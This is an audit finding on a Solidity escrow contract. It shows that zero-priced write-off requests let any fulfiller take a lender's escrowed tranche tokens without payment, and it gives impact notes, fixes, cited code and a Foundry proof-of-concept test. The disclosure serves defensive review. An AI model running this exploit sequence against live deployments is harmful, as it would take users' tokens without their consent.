### Title
Zero-priced write-off request lets a fulfiller seize escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` validates only that escrowed `amount` is nonzero, while allowing `underlyingsRequested` to remain zero. [1](#0-0)  `fullfillWriteOffRequest` then accepts any payment at least equal to the stored ask, so a zero ask can be fulfilled with zero underlying tokens and the fulfiller receives the entire escrowed tranche balance. [2](#0-1) 

### Finding Description
While an epoch is running, a lender can escrow `amount > 0` tranche tokens and leave `underlyingsRequested` at its zero default. [1](#0-0)  Any unprivileged fulfiller can call `fullfillWriteOffRequest(victim, request.tranches, 0)`, pass the request check, pay no underlying, and receive all escrowed tranche tokens. [3](#0-2)  The same defect also applies when an existing request is topped up with additional tranche tokens but a zero or dust incremental ask, because the new tranche amount is added without requiring a corresponding price increase. [4](#0-3) 

### Impact Explanation
The fulfiller can acquire the victim’s escrowed tranche tokens for zero underlying payment when the aggregate request price is zero, or for only the previously recorded price when a later zero-priced top-up added collateral. [5](#0-4)  The direct loss equals `currentRequest.tranches` for a fully zero-priced request, or the incremental tranche amount for a zero-priced top-up. [6](#0-5) 

### Likelihood Explanation
Exploitation requires a lender to create a zero-priced request or zero-priced top-up, but execution is then permissionless and atomic for any fulfiller. [7](#0-6)  The request path requires only a running epoch and nonzero tranche collateral; it does not require privileged access, borrower cooperation, oracle manipulation, or an underflow. [8](#0-7)  `nonReentrant` prevents reentrancy but does not validate the economic terms of the request. [9](#0-8) 

### Recommendation
Reject zero `underlyingsRequested` in `createWriteOffRequest`, and consider requiring the aggregate request price to increase whenever additional tranche collateral is added. Alternatively, replace rather than accumulate request terms so a later call cannot attach new collateral to an outdated ask. A defense-in-depth check in `fullfillWriteOffRequest` should also reject `currentRequest.underlyings == 0`.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVaultWriteOffEscrow} from
  "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract ZeroAskWriteOffEscrowPoC is Test {
  function testZeroAskRequestCanBeFilledForNothing() external {
    // Bind these to the deployment under test, or reuse the existing
    // IdleCreditVaultWriteOffEscrow.t.sol fixture variables.
    IdleCreditVaultWriteOffEscrow escrow =
      IdleCreditVaultWriteOffEscrow(vm.envAddress("WRITE_OFF_ESCROW"));
    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(escrow.idleCDOEpoch());
    IERC20Detailed tranche = IERC20Detailed(escrow.tranche());
    IERC20Detailed underlying = IERC20Detailed(escrow.underlying());

    address lender = makeAddr("lender");
    address fulfiller = makeAddr("fulfiller");
    uint256 trancheAmount = 100e18;

    // The exploit is valid only while the credit-vault epoch is running.
    // In the repository fixture, arrange the existing honest manager call
    // that starts the epoch before executing this sequence.
    require(cdo.isEpochRunning(), "epoch must be running");

    deal(address(tranche), lender, trancheAmount);

    vm.startPrank(lender);
    tranche.approve(address(escrow), trancheAmount);
    escrow.createWriteOffRequest(trancheAmount, 0);
    vm.stopPrank();

    (uint256 escrowedTranches, uint256 requestedUnderlying) =
      escrow.userRequests(lender);
    assertEq(escrowedTranches, trancheAmount);
    assertEq(requestedUnderlying, 0);

    uint256 fulfillerUnderlyingBefore = underlying.balanceOf(fulfiller);

    vm.prank(fulfiller);
    escrow.fullfillWriteOffRequest(lender, trancheAmount, 0);

    assertEq(tranche.balanceOf(fulfiller), trancheAmount);
    assertEq(underlying.balanceOf(fulfiller), fulfillerUnderlyingBefore);
    (uint256 remainingTranches, uint256 remainingUnderlying) =
      escrow.userRequests(lender);
    assertEq(remainingTranches, 0);
    assertEq(remainingUnderlying, 0);
  }
}
```

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-101)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L122-151)
```text
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
